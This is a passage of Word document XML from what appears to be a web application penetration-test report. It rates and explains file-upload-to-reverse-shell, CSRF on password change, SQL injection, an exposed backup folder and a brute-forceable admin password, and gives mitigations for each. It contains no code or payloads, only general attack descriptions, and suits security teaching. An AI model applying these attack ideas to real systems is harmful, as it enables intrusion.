            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p w14:paraId="3DCBA90E" w14:textId="0157E85F" w:rsidR="003B6447" w:rsidRDefault="003B6447" w:rsidP="003B6447">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Hard</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="107D72EA" w14:textId="77777777" w:rsidR="003B6447" w:rsidRPr="00292DEC" w:rsidRDefault="003B6447" w:rsidP="003B6447">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63A9DCD7" w14:textId="37AE22CC" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00A4435D" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This vulnerability consists of the ability to send a file containing malicious code to the server. After it has been successfully uploaded it can be activated by navigating to it using a web browser. The most dangerous type of code that can be uploaded is code that sets up a reverse shell. With this the attacker would have unrestricted access to the server and could use this to do extensive damage such as extracting sensitive data from the database or ransoming the website by shutting down service until payment is made. Either of these two</w:t>
      </w:r>
      <w:r w:rsidR="002421D7" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> examples could cost the company a lot of money and therefore it is vital to prevent such an attack from taking place. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E79C7E6" w14:textId="3B2E5208" w:rsidR="003B6447" w:rsidRPr="00292DEC" w:rsidRDefault="00F832BA" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>One</w:t>
      </w:r>
      <w:r w:rsidR="003B6447" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> way to </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>mitigate</w:t>
      </w:r>
      <w:r w:rsidR="003B6447" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> this is to implement more vigorous checks of the user inputs. This can involve disallowing more file types and checking the magic number of uploaded files.</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> It is also recommended that these files be stored in a non-publicly accessible location. However, the most effective solution may be to set the file as non-executable when it is uploaded</w:t>
      </w:r>
      <w:r w:rsidR="00ED3417" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Sanz, 2021)</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C328148" w14:textId="0B024589" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Cross Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr w:rsidR="00466D0E" w14:paraId="49D4E39A" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="B35E06" w:themeFill="accent1" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="1636EC70" w14:textId="28C92B29" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
          </w:tcPr>
          <w:p w14:paraId="72FC083C" w14:textId="2C4CB7E1" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Intermediate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="71324B58" w14:textId="77777777" w:rsidR="003B6447" w:rsidRPr="003B6447" w:rsidRDefault="003B6447" w:rsidP="003B6447">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BF3394B" w14:textId="3F5107EE" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00641D49" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">CSRF is a serious </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>risk if</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> present on any page of a website. However, when it is present on a password update function, as it is here, it becomes far more concerning. With the ability to change the password of any user for which they can exploit with this it becomes a major vulnerability that cannot be ignored. The only mitigating factor with this is that gaining the cookies of users would most likely be a tricky task and may need to be done manually, drastically decreasing the number of accounts that could be compromised at any one time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D48D3D0" w14:textId="5F6B61B9" w:rsidR="00641D49" w:rsidRPr="00292DEC" w:rsidRDefault="00641D49" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To resolve this issue an Anti-CSRF token can be implemented</w:t>
      </w:r>
      <w:r w:rsidR="00ED3417" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Varghese, 2021)</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. This challenges the user trying to change the password with another </w:t>
      </w:r>
      <w:r w:rsidR="00742BDC" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">token that is assigned to the session. An authorised user would not notice a difference. However, an attacker would be forced to guess the token. If implemented correctly the token would be randomly generated and therefore not be vulnerable to frequency guessing. It should also expire, either after a set time or when the user logs out. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54970801" w14:textId="48898070" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00466D0E" w14:paraId="0E2C5C74" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="761E28" w:themeFill="accent2" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7DB34A32" w14:textId="0ED175E6" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="19F6050C" w14:textId="0A29B938" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E111989" w14:textId="77777777" w:rsidR="00466D0E" w:rsidRPr="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B3FE161" w14:textId="19794A30" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00FD6009" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>SQL injection can easily be seen as innocuous, especially when the prevention methods are so complex. This can lead to complacency on the part of the administrator, when in fact the limits of an SQL injection are often the imagination and tenacity of the attacker. With this vulnerability it is possible for a malicious actor to request or submit data that was not intended for users to have access to.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1FC94F" w14:textId="7F30EE78" w:rsidR="005635CE" w:rsidRPr="00292DEC" w:rsidRDefault="005635CE" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">There is a function called “clean()” already on the website. This effectively sanitises </w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>user input, however, it is not implemented on all data that is taken from the user. Rectifying this and properly sanitising user input would greatly reduce the chances of an attacker being able to exploit this vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023B8DF8" w14:textId="14A4BAB8" w:rsidR="002E765C" w:rsidRDefault="00804A22" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>H</w:t>
      </w:r>
      <w:r w:rsidR="002E765C" w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>idden folder</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00466D0E" w14:paraId="2194A3A2" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="B35E06" w:themeFill="accent1" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7BE30166" w14:textId="6CB12AF9" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="381BE7B4" w14:textId="38003AF8" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E9BE73C" w14:textId="77777777" w:rsidR="00466D0E" w:rsidRPr="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A37D623" w14:textId="50C77432" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00801808" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The hidden folder found on this web application was a backup file containing information about the countermeasures implemented against SQL Injection. By leaking this </w:t>
      </w:r>
      <w:r w:rsidR="00641D49" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>information,</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> a hacker could easily bypass the countermeasures as their greatest strength </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">fact </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">that hackers </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">would </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">not </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> exactly why their attempt was rejected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E695D3" w14:textId="193C3778" w:rsidR="00641D49" w:rsidRPr="00292DEC" w:rsidRDefault="00641D49" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Since the file was merely a backup it is recommended that such sensitive backup information is kept on a non-networked storage device so that a hacker cannot gain access to it remotely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37ACC7AF" w14:textId="63CA9222" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Brute-forceable Admin password</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr w:rsidR="00466D0E" w14:paraId="59636108" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0D0D0D" w:themeFill="text1" w:themeFillTint="F2"/>
          </w:tcPr>
          <w:p w14:paraId="29163951" w14:textId="462623EA" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
          </w:tcPr>
          <w:p w14:paraId="75766090" w14:textId="761F47E6" w:rsidR="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Intermediate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D550FF8" w14:textId="77777777" w:rsidR="00466D0E" w:rsidRPr="00466D0E" w:rsidRDefault="00466D0E" w:rsidP="00466D0E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02DD9FA2" w14:textId="0EC18E84" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00C57A00" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Due to</w:t>
      </w:r>
      <w:r w:rsidR="00F50E1E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> the weak quality of the admin password</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00F50E1E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> it is easy for a malicious user to guess the password in use. To compound this issue, there is no prevention method to stop multiple attempts to login. This means that an attacker can run an entire dictionary with millions of entries, or a systematic attack that iterates through numbers and letters, in order to gain access. The fact that this is the case for the admin section of the web application is particularly troubling as the access level of an admin is much higher than the average user, and the protections in place to access these accounts should be higher</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4981CC44" w14:textId="33FAD1A7" w:rsidR="00F50E1E" w:rsidRPr="00292DEC" w:rsidRDefault="00F50E1E" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>There are two avenues of attack when it comes to this issue. The first is the password itself</w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, which </w:t>
      </w:r>
      <w:r w:rsidR="00D25ACF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>can be rectified by improving the strength of the password by picking something that is not a word and is complex. i.e includes lower and upper case characters as well as being long and containing special characters like “!” or “*”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D746338" w14:textId="7AF3E8B4" w:rsidR="00292DEC" w:rsidRDefault="00F50E1E" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The second is the ability to </w:t>
      </w:r>
      <w:r w:rsidR="00466D0E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>prevent</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> repeated attempts to login.</w:t>
      </w:r>
      <w:r w:rsidR="00D25ACF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00466D0E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">This can be done by locking out the account after a certain number of login attempts. Even limiting it to 100 login attempts a day would prevent a dictionary attack. A recommended number would be 3-5 and ensure there is a secure password reset </w:t>
      </w:r>
      <w:r w:rsidR="005B6FFF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>feature</w:t>
      </w:r>
      <w:r w:rsidR="00466D0E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A334868" w14:textId="77777777" w:rsidR="00292DEC" w:rsidRDefault="00292DEC">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="014AA416" w14:textId="0A2659F3" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="57"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>General Discussion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C55812C" w14:textId="61989779" w:rsidR="00790807" w:rsidRPr="00292DEC" w:rsidRDefault="00BB7585" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>It is</w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> understood that </w:t>
      </w:r>
      <w:r w:rsidR="006020E5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">data </w:t>
